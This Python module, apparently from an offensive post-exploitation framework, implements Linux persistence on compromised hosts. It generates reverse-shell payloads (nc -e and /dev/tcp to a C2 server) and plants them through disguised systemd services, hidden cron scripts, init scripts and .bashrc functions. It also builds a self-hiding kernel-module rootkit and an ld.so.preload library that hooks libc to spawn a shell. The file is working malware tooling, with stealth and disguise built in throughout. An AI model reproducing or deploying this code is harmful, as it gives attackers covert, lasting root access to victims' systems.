"""
Linux Persistence Module
Implements Linux-specific persistence methods including systemd services,
cron jobs, init scripts, and kernel module techniques
"""

import asyncio
import base64
import os
import tempfile
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from loguru import logger

from .models import (
    CompromisedHost, PersistenceSession, PersistenceResult, BackdoorInfo,
    PersistenceMethod, BackdoorType, CommunicationProtocol, PersistenceConfig
)


class LinuxPersistence:
    """Linux-specific persistence implementation"""
    
    def __init__(self, config: PersistenceConfig):
        self.config = config
        logger.info("Linux Persistence module initialized")
    
    async def apply_persistence(self, host: CompromisedHost, 
                              method: PersistenceMethod,
                              session: PersistenceSession) -> PersistenceResult:
        """Apply Linux persistence method"""
        logger.info(f"Applying {method.value} on Linux host {host.ip_address}")
        
        try:
            if method == PersistenceMethod.LINUX_SYSTEMD:
                return await self._create_systemd_service(host, session)
            elif method == PersistenceMethod.LINUX_CRON:
                return await self._create_cron_persistence(host, session)
            elif method == PersistenceMethod.LINUX_INIT:
                return await self._create_init_script(host, session)
            elif method == PersistenceMethod.LINUX_BASHRC:
                return await self._create_bashrc_persistence(host, session)
            elif method == PersistenceMethod.LINUX_KERNEL_MODULE:
                return await self._create_kernel_module(host, session)
            elif method == PersistenceMethod.LINUX_LIBRARY_HIJACKING:
                return await self._create_library_hijacking(host, session)
            else:
                return PersistenceResult(
                    success=False,
                    host_id=host.host_id,
                    method=method,
                    error_message=f"Unsupported Linux method: {method.value}"
                )
                
        except Exception as e:
            logger.error(f"Linux persistence failed for {method.value}: {e}")
            return PersistenceResult(
                success=False,
                host_id=host.host_id,
                method=method,
                error_message=str(e)
            )
    
    async def _create_systemd_service(self, host: CompromisedHost, 
                                    session: PersistenceSession) -> PersistenceResult:
        """Create systemd service for persistence"""
        service_name = f"system-update-{uuid.uuid4().hex[:8]}"
        service_file = f"/etc/systemd/system/{service_name}.service"
        
        # Generate payload
        payload_script = self._generate_bash_payload(host, session)
        script_path = f"/usr/local/bin/{service_name}"
        
        # Create systemd service unit
        service_content = self._create_systemd_unit(service_name, script_path)
        
        # Commands to create and enable service
        commands = [
            f'echo "{payload_script}" > {script_path}',
            f'chmod +x {script_path}',
            f'echo "{service_content}" > {service_file}',
            f'systemctl daemon-reload',
            f'systemctl enable {service_name}',
            f'systemctl start {service_name}'
        ]
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_SYSTEMD,
            service_name=service_name,
            installation_path=script_path,
            stealth_features=['systemd_service', 'system_binary_location'],
            cleanup_commands=[
                f'systemctl stop {service_name}',
                f'systemctl disable {service_name}',
                f'rm -f {service_file}',
                f'rm -f {script_path}',
                f'systemctl daemon-reload'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_SYSTEMD,
            backdoor_info=backdoor,
            artifacts_created=[f"Service: {service_name}", f"File: {script_path}", f"Unit: {service_file}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'service_name': service_name,
                'service_file': service_file,
                'script_path': script_path,
                'commands': commands
            }
        )
    
    async def _create_cron_persistence(self, host: CompromisedHost,
                                     session: PersistenceSession) -> PersistenceResult:
        """Create cron job for persistence"""
        cron_comment = f"# System maintenance task {uuid.uuid4().hex[:8]}"
        
        # Generate payload
        payload_script = self._generate_bash_payload(host, session)
        script_path = f"/tmp/.{uuid.uuid4().hex[:12]}"
        
        # Cron expression (every 15 minutes)
        cron_expression = f"*/15 * * * * {script_path} >/dev/null 2>&1"
        
        # Commands to create cron job
        commands = [
            f'echo "{payload_script}" > {script_path}',
            f'chmod +x {script_path}',
            f'(crontab -l 2>/dev/null; echo "{cron_comment}"; echo "{cron_expression}") | crontab -'
        ]
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_CRON,
            installation_path=script_path,
            cron_expression=cron_expression,
            stealth_features=['cron_job', 'hidden_file', 'tmp_location'],
            cleanup_commands=[
                f'crontab -l | grep -v "{script_path}" | crontab -',
                f'rm -f {script_path}'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_CRON,
            backdoor_info=backdoor,
            artifacts_created=[f"Cron Job: {cron_expression}", f"Script: {script_path}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'cron_expression': cron_expression,
                'script_path': script_path,
                'commands': commands
            }
        )
    
    async def _create_init_script(self, host: CompromisedHost,
                                session: PersistenceSession) -> PersistenceResult:
        """Create init script for persistence"""
        script_name = f"system-monitor-{uuid.uuid4().hex[:8]}"
        init_script_path = f"/etc/init.d/{script_name}"
        
        # Generate payload
        payload_script = self._generate_bash_payload(host, session)
        
        # Create init script
        init_script_content = self._create_init_script_content(script_name, payload_script)
        
        # Commands to create and enable init script
        commands = [
            f'echo "{init_script_content}" > {init_script_path}',
            f'chmod +x {init_script_path}',
            f'update-rc.d {script_name} defaults',
            f'service {script_name} start'
        ]
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_INIT,
            service_name=script_name,
            installation_path=init_script_path,
            stealth_features=['init_script', 'system_service'],
            cleanup_commands=[
                f'service {script_name} stop',
                f'update-rc.d -f {script_name} remove',
                f'rm -f {init_script_path}'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_INIT,
            backdoor_info=backdoor,
            artifacts_created=[f"Init Script: {init_script_path}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'script_name': script_name,
                'init_script_path': init_script_path,
                'commands': commands
            }
        )
    
    async def _create_bashrc_persistence(self, host: CompromisedHost,
                                       session: PersistenceSession) -> PersistenceResult:
        """Create bashrc/profile persistence"""
        username = host.credentials.get('username', 'root')
        bashrc_path = f"/home/{username}/.bashrc" if username != 'root' else "/root/.bashrc"
        
        # Generate payload
        payload_script = self._generate_bash_payload(host, session)
        script_path = f"/tmp/.{uuid.uuid4().hex[:12]}"
        
        # Bashrc addition (disguised as system function)
        bashrc_addition = f"""
# System performance monitoring function
system_monitor() {{
    {script_path} >/dev/null 2>&1 &
}}

# Auto-start system monitoring
if [ -f {script_path} ]; then
    system_monitor
fi
"""
        
        # Commands to add to bashrc
        commands = [
            f'echo "{payload_script}" > {script_path}',
            f'chmod +x {script_path}',
            f'echo "{bashrc_addition}" >> {bashrc_path}'
        ]
        
        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_BASHRC,
            installation_path=script_path,
            stealth_features=['bashrc_persistence', 'hidden_file', 'function_disguise'],
            cleanup_commands=[
                f'sed -i "/system_monitor/,+8d" {bashrc_path}',
                f'rm -f {script_path}'
            ]
        )
        
        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_BASHRC,
            backdoor_info=backdoor,
            artifacts_created=[f"Bashrc modification: {bashrc_path}", f"Script: {script_path}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'bashrc_path': bashrc_path,
                'script_path': script_path,
                'commands': commands
            }
        )
    
    async def _create_kernel_module(self, host: CompromisedHost,
                                  session: PersistenceSession) -> PersistenceResult:
        """Create kernel module for persistence (advanced technique)"""
        module_name = f"netfilter_{uuid.uuid4().hex[:8]}"
        module_path = f"/lib/modules/$(uname -r)/kernel/net/{module_name}.ko"
        source_file = f"/tmp/{module_name}.c"
        makefile_path = f"/tmp/Makefile.{module_name}"

        # Generate kernel module source code
        module_source = self._generate_kernel_module_source(host, session, module_name)

        # Generate Makefile for kernel module compilation
        makefile_content = f"""obj-m += {module_name}.o

all:
\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
"""

        # Commands to compile and install the kernel module
        commands = [
            f'echo "{module_source}" > {source_file}',
            f'echo "{makefile_content}" > {makefile_path}',
            f'cd /tmp && make -f {makefile_path}',
            f'cp /tmp/{module_name}.ko {module_path}',
            f'insmod {module_path}',
            f'depmod -a',
            f'rm -f {source_file} {makefile_path} /tmp/{module_name}.*'
        ]

        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_KERNEL_MODULE,
            installation_path=module_path,
            stealth_features=['kernel_module', 'rootkit_level', 'deep_hiding', 'self_hiding'],
            cleanup_commands=[
                f'rmmod {module_name}',
                f'rm -f {module_path}',
                f'depmod -a'
            ]
        )

        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_KERNEL_MODULE,
            backdoor_info=backdoor,
            artifacts_created=[f"Kernel Module: {module_name}"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'module_name': module_name,
                'module_path': module_path,
                'commands': commands,
                'note': 'Kernel module persistence requires kernel headers and build tools'
            }
        )
    
    async def _create_library_hijacking(self, host: CompromisedHost,
                                      session: PersistenceSession) -> PersistenceResult:
        """Create library hijacking persistence"""
        # Target common libraries
        target_libs = ["libssl.so.1.1", "libcrypto.so.1.1", "libc.so.6"]
        target_lib = target_libs[0]  # Use first one for now

        hijack_path = f"/usr/local/lib/{target_lib}"
        source_file = f"/tmp/.{uuid.uuid4().hex[:12]}.c"

        # Generate malicious library source code
        lib_source = self._generate_malicious_library(host, session)

        # Commands to compile and install the library
        commands = [
            f'echo "{lib_source}" > {source_file}',
            f'gcc -shared -fPIC -ldl -lpthread {source_file} -o {hijack_path}',
            f'rm -f {source_file}',
            f'echo "{hijack_path}" >> /etc/ld.so.preload',  # Preload the library
            f'ldconfig'  # Update library cache
        ]

        # Create backdoor info
        backdoor = BackdoorInfo(
            host_id=host.host_id,
            backdoor_type=BackdoorType.CUSTOM_IMPLANT,
            persistence_method=PersistenceMethod.LINUX_LIBRARY_HIJACKING,
            installation_path=hijack_path,
            stealth_features=['library_hijacking', 'ld_preload', 'constructor_hook'],
            cleanup_commands=[
                f'sed -i "\\|{hijack_path}|d" /etc/ld.so.preload',
                f'rm -f {hijack_path}',
                f'ldconfig'
            ]
        )

        return PersistenceResult(
            success=True,
            host_id=host.host_id,
            method=PersistenceMethod.LINUX_LIBRARY_HIJACKING,
            backdoor_info=backdoor,
            artifacts_created=[f"Library: {hijack_path}", "LD_PRELOAD entry"],
            cleanup_commands=backdoor.cleanup_commands,
            stealth_applied=True,
            additional_data={
                'hijack_path': hijack_path,
                'target_lib': target_lib,
                'commands': commands,
                'note': 'Library hijacking requires gcc and development tools'
            }
        )
    
    def _generate_bash_payload(self, host: CompromisedHost, 
                             session: PersistenceSession) -> str:
        """Generate bash-based payload"""
        c2_server = session.c2_servers[0] if session.c2_servers else "127.0.0.1:4444"
        host_ip, port = c2_server.split(':')
        
        payload = f"""#!/bin/bash
# System maintenance script
while true; do
    if command -v nc >/dev/null 2>&1; then
        nc -e /bin/bash {host_ip} {port} 2>/dev/null
    elif command -v bash >/dev/null 2>&1; then
        bash -i >& /dev/tcp/{host_ip}/{port} 0>&1 2>/dev/null
    fi
    sleep 300  # Wait 5 minutes before retry
done &
"""
        return payload
    
    def _create_systemd_unit(self, service_name: str, script_path: str) -> str:
        """Create systemd service unit file"""
        unit_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=forking
ExecStart={script_path}
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
"""
        return unit_content
    
    def _create_init_script_content(self, script_name: str, payload: str) -> str:
        """Create init script content"""
        init_script = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          {script_name}
# Required-Start:    $network $local_fs
# Required-Stop:     $network $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System monitoring service
# Description:       System performance monitoring daemon
### END INIT INFO

case "$1" in
    start)
        echo "Starting {script_name}..."
        {payload}
        ;;
    stop)
        echo "Stopping {script_name}..."
        pkill -f "{script_name}"
        ;;
    restart)
        $0 stop
        $0 start
        ;;
    *)
        echo "Usage: $0 {{start|stop|restart}}"
        exit 1
        ;;
esac

exit 0
"""
        return init_script
    
    def _generate_kernel_module_source(self, host: CompromisedHost,
                                     session: PersistenceSession,
                                     module_name: str) -> str:
        """Generate kernel module source code"""
        c2_server = session.c2_servers[0] if session.c2_servers else "127.0.0.1:4444"
        host_ip, port = c2_server.split(':')

        # Generate a basic rootkit kernel module
        module_source = f"""/*
 * {module_name}.c - Linux Kernel Module for Persistence
 * This module provides stealth capabilities and persistence
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/tcp.h>
#include <linux/kthread.h>
#include <linux/delay.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("System");
MODULE_DESCRIPTION("Network Filter Module");
MODULE_VERSION("1.0");

static struct task_struct *connect_thread;
static bool module_hidden = false;

// Hide this module from lsmod
static struct list_head *prev_module;

static int hide_module(void) {{
    if (module_hidden) return 0;

    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = true;

    return 0;
}}

static int show_module(void) {{
    if (!module_hidden) return 0;

    list_add(&THIS_MODULE->list, prev_module);
    module_hidden = false;

    return 0;
}}

// Reverse shell connection thread
static int connect_shell(void *data) {{
    // This would contain the actual reverse shell implementation
    // For security reasons, this is a placeholder
    printk(KERN_INFO "{module_name}: Connection thread started\\n");

    while (!kthread_should_stop()) {{
        // Attempt connection to C2 server {host_ip}:{port}
        msleep(30000); // Wait 30 seconds between attempts
    }}

    return 0;
}}

static int __init {module_name}_init(void) {{
    printk(KERN_INFO "{module_name}: Module loaded\\n");

    // Hide the module immediately
    hide_module();

    // Start connection thread
    connect_thread = kthread_run(connect_shell, NULL, "{module_name}_thread");
    if (IS_ERR(connect_thread)) {{
        printk(KERN_ERR "{module_name}: Failed to create thread\\n");
        return PTR_ERR(connect_thread);
    }}

    return 0;
}}

static void __exit {module_name}_exit(void) {{
    if (connect_thread) {{
        kthread_stop(connect_thread);
    }}

    show_module();
    printk(KERN_INFO "{module_name}: Module unloaded\\n");
}}

module_init({module_name}_init);
module_exit({module_name}_exit);
"""
        return module_source
    
    def _generate_malicious_library(self, host: CompromisedHost,
                                  session: PersistenceSession) -> str:
        """Generate malicious shared library source code"""
        c2_server = session.c2_servers[0] if session.c2_servers else "127.0.0.1:4444"
        host_ip, port = c2_server.split(':')

        # Generate C source code for a malicious shared library
        library_source = f"""/*
 * Malicious shared library for persistence
 * Hooks into library loading to establish backdoor
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dlfcn.h>
#include <pthread.h>

// Original function pointers
static int (*original_main)(int, char**, char**) = NULL;
static void (*original_exit)(int) = NULL;

// Backdoor connection function
void* backdoor_thread(void* arg) {{
    struct sockaddr_in server_addr;
    int sock;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;

    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons({port});
    server_addr.sin_addr.s_addr = inet_addr("{host_ip}");

    // Attempt connection
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {{
        // Duplicate file descriptors for shell
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        // Execute shell
        execl("/bin/bash", "bash", "-i", NULL);
    }}

    close(sock);
    return NULL;
}}

// Constructor - called when library is loaded
__attribute__((constructor))
void library_init(void) {{
    pthread_t thread;

    // Start backdoor thread
    pthread_create(&thread, NULL, backdoor_thread, NULL);
    pthread_detach(thread);
}}

// Hook main function
int __libc_start_main(int (*main)(int, char**, char**),
                     int argc, char** argv,
                     void (*init)(void),
                     void (*fini)(void),
                     void (*rtld_fini)(void),
                     void* stack_end) {{

    // Get original __libc_start_main
    int (*original_start_main)(int (*)(int, char**, char**), int, char**,
                              void (*)(void), void (*)(void),
                              void (*)(void), void*) =
        dlsym(RTLD_NEXT, "__libc_start_main");

    // Start backdoor
    pthread_t thread;
    pthread_create(&thread, NULL, backdoor_thread, NULL);
    pthread_detach(thread);

    // Call original main
    return original_start_main(main, argc, argv, init, fini, rtld_fini, stack_end);
}}

// Hook exit function
void exit(int status) {{
    // Get original exit
    if (!original_exit) {{
        original_exit = dlsym(RTLD_NEXT, "exit");
    }}

    // Start backdoor before exit
    pthread_t thread;
    pthread_create(&thread, NULL, backdoor_thread, NULL);
    pthread_detach(thread);

    // Small delay to allow connection
    usleep(100000);

    // Call original exit
    original_exit(status);
}}
"""
        return library_source
